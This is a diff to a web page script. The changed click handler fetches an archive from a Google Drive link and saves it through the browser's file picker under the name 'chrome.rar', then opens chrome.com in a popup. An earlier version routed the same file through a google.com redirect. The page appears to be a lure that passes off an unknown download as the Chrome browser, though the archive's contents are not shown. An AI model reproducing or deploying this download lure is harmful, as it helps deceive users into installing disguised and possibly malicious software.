@@ -19,21 +19,37 @@ pre { background:#111;color:#0f0;padding:10px }
 const logEl = document.getElementById("log");
 const log = m => logEl.textContent += m + "\n";
 
-document.getElementById("btn").onclick = () => {
+document.getElementById("btn").onclick = async () => {
 
   log("[1] User click received");
 
-  const url = "https://www.google.com/url?q=https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL";
+  const url = "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL";
 
-  const a = document.createElement("a");
-  a.href = url;
-  a.download = "chrome.rar";   // nama file yang akan muncul di file picker
+  try {
 
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
+    log("[2] Opening save file picker");
 
-  log("[2] Download request triggered");
+    const handle = await window.showSaveFilePicker({
+      suggestedName: "chrome.rar",
+      types: [{
+        description: "RAR Archive",
+        accept: { "application/x-rar-compressed": [".rar"] }
+      }]
+    });
+
+    const response = await fetch(url);
+    const blob = await response.blob();
+
+    const writable = await handle.createWritable();
+
+    await writable.write(blob);
+    await writable.close();
+
+    log("[3] File saved");
+
+  } catch(e) {
+    log("[ERROR] " + e);
+  }
 
   const w = window.open(
     "https://chrome.com",
@@ -49,7 +65,7 @@ document.getElementById("btn").onclick = () => {
   if(!w){
     log("[ERROR] Popup blocked");
   } else {
-    log("[3] Popup opened");
+    log("[4] Popup opened");
   }
 
 };
